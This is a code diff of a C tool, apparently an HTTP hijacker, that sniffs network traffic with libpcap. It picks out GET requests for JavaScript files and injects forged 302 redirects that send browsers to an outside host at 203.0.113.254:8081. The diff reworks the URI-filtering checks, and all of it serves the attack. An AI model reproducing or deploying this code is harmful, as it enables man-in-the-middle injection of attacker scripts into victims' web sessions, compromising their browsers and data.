@@ -11,6 +11,7 @@
 #include <time.h>
 #include <math.h>
 #include <string.h>
+#include <bsd/string.h>
 
 #define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://203.0.113.254:8081/?%s%s\r\n"
 #define PCAPFILTER "dst port 80 and tcp[tcpflags] & tcp-push != 0"
@@ -35,7 +36,6 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 
     char http_get[128] = {0};
     char http_host[128] = {0};
-    size_t get_pos;
     char *_get, *_host;
     const char* payload = (const char *)packet + ETHER_HDR_LEN + LIBNET_IPV4_H + LIBNET_TCP_H;
     //const char* payload = (const char *)packet + 0x44 + LIBNET_IPV4_H + LIBNET_TCP_H;
@@ -45,54 +45,66 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 #ifdef DEBUG
         fprintf(stderr, "Non HTTP GET, pass\n");
 #endif
-        return;
+        goto skiphiject;
     }
 
     /* GET / HTTP/1.1\r\n  */
-    if((*payload+5) == ' ') {
+    if(*(payload+5) == ' ') {
 #ifdef DEBUG
         fprintf(stderr, "Index GET, pass\n");
 #endif
-        return;
+        goto skiphiject;
     }
 
+    /* Check GET longer 100 */
     _get = memchr(payload, '\r', 100);
-
     if (_get == NULL) {
 #ifdef DEBUG
         fprintf(stderr, "URI Longer than 100, pass\n");
 #endif
-        return;
+        goto skiphiject;
     }
 
-    get_pos = _get - payload;
+    /* Check GET at least 4 char */
+    if(_get - payload < 18) {
+#ifdef DEBUG
+        fprintf(stderr, "URL too short, pass\n");
+#endif
+        goto skiphiject;
+    }
 
-    if (*(payload+get_pos-1) == '/') {
+    /* Check ends with '/' */
+    if (*(_get - 10) == '/') {
 #ifdef DEBUG
         fprintf(stderr, "Diretory URI, pass\n");
 #endif
-        return;
+        goto skiphiject;
     }
 
-    memcpy(http_get, payload+4, get_pos-13);
-
-    size_t urllen = strlen(http_get);
-    char *suffix = http_get + urllen - 3;
-
-    // ends with '.js'
-    if(!(*suffix == '.' && *(suffix+1) == 'j' && *(suffix+2) == 's')) {
+    /* Check ends with '.js' */
+    char *suffix = _get - 12;
+    if(*suffix == '.' && *(suffix+1) == 'j' && *(suffix+2) == 's') {
 #ifdef DEBUG
-        fprintf(stderr, "URI not ends with .js\n");
+        fprintf(stderr, "URI ends with .js, go inject\n");
 #endif
-        if(strstr(http_get, ".js?") == NULL) {
-#ifdef DEBUG
-            fprintf(stderr, "URI not match .js at all, pass\n");
-#endif
-            return;
-        }
+        goto gohiject;
     }
 
-    _host = strcasestr(payload+get_pos, "host:")+6;
+    /* Check contains ".js?" */
+    if(strnstr(payload+4, ".js?", _get - payload) == NULL) {
+#ifdef DEBUG
+        fprintf(stderr, "URI not match .js at all, pass\n");
+#endif
+        goto skiphiject;
+    }
+
+gohiject:
+
+    //URI
+    memcpy(http_get, payload+4, _get - payload - 13);
+
+    // Find Host Header
+    _host = strcasestr(_get, "host:")+6;
     memcpy(http_host, _host, (strstr(_host, "\r\n") - _host));
 
 #ifdef DEBUG
@@ -100,6 +112,8 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 #endif
 
     inject(packet, http_get, http_host);
+
+skiphiject:
     return;
 }
 
